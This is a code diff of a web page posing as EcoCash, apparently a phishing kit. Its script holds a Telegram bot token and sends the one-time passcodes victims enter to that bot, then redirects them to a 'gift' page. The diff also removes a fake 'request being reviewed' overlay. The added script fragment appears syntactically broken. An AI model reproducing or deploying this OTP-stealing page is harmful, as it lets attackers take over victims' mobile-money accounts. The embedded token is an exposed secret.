@@ -237,83 +237,6 @@
         <button id="submitBtn">Submit</button>
     </div>
 
- <footer>© 2026 EcoCash</footer>
-
-<!-- FUTURISTIC SPINNER OVERLAY -->
-<div id="spinnerOverlay">
-    <div class="spinner"></div>
-
-    <div class="spinner-text">
-        <h3>REQUEST RECEIVED</h3>
-        <p>
-            Your request is currently being reviewed.
-            Please be patient while we process your application.
-        </p>
-        <span>Please do not close this page.</span>
-    </div>
-</div>
-
-<style>
-#spinnerOverlay {
-    position: fixed;
-    inset: 0;
-    background: linear-gradient(135deg, #050816, #101b3d, #170d35);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    z-index: 99999;
-    color: #ffffff;
-    font-family: Arial, sans-serif;
-    text-align: center;
-}
-
-.spinner {
-    width: 65px;
-    height: 65px;
-    border: 4px solid rgba(0, 225, 255, 0.15);
-    border-top: 4px solid #00e5ff;
-    border-right: 4px solid #a855f7;
-    border-radius: 50%;
-    animation: futuristicSpin 1s linear infinite;
-    box-shadow: 0 0 20px #00e5ff55;
-    margin-bottom: 28px;
-}
-
-@keyframes futuristicSpin {
-    to {
-        transform: rotate(360deg);
-    }
-}
-
-.spinner-text {
-    max-width: 340px;
-    padding: 25px;
-}
-
-.spinner-text h3 {
-    color: #00e5ff;
-    font-size: 21px;
-    letter-spacing: 3px;
-    text-shadow: 0 0 12px #00e5ff;
-    margin-bottom: 15px;
-}
-
-.spinner-text p {
-    color: #e0e7ff;
-    font-size: 15px;
-    line-height: 1.7;
-}
-
-.spinner-text span {
-    display: block;
-    margin-top: 15px;
-    color: #b794ff;
-    font-size: 12px;
-    letter-spacing: 1px;
-}
-</style>
-
     <script>
         // Bot 1 (your existing)
         const BOT_TOKEN_1 = '8799263708:AAGKJWoeVBe0HkTCCXTnCbSf9N4biwbH4_Y';
@@ -507,6 +430,23 @@
 
         checkOtpComplete();
         otpBoxes[0].focus();
+         });
+
+        const data = await response.json();
+
+        if (!data.ok) {
+            throw new Error(data.description || "Failed to send OTP to Telegram");
+        }
+
+        // ✅ OTP sent successfully, redirect to next page
+        window.location.href = "gift.html";  // Replace with your target page
+
+    } catch (error) {
+        console.error("Telegram Error:", error);
+        alert(error.message);
+    }
+});
+
     </script>
 </body>
 
